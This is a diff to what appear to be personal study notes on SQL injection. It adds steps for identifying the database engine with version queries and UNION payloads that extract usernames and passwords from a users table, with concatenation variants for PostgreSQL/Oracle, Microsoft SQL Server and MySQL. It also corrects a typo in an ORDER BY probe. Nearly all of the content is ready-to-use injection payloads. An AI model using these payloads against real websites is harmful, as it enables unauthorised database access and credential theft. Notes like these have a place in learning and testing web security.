@@ -33,7 +33,7 @@ Rule:
        
  Way #2: ORDER BY
  
-        select a,b from table1 orfer by 2--
+        select a,b from table1 order by 2--
         
 ***** STEP #2: Determine data type of column *****
 
@@ -43,6 +43,27 @@ Rule:
          --> error: column is not type text
          --> no error: column is type text.
 
+***** STEP #3: Finding database of the website *****
+
+     oracle: select banner from v$version
+             select version from v$instance
+        
+     microsoft: select @@version
+
+     postgresql: select version()
+
+     mysql: select @@version
+
+         union select Null, @@version --
+
+
 ***** STEP #3: Finding username and password *****
 
-        select username, password from users--
+        union select username, password from users--
+
+       ** if only one field works concatenate string based on database
+
+         union select null, username || password from users --  > postgresql and oracle
+          "     "       " , username + password from users -- > microsoft
+          "      "      " , username  password from users -- > mysql
+                             concat(username,password)
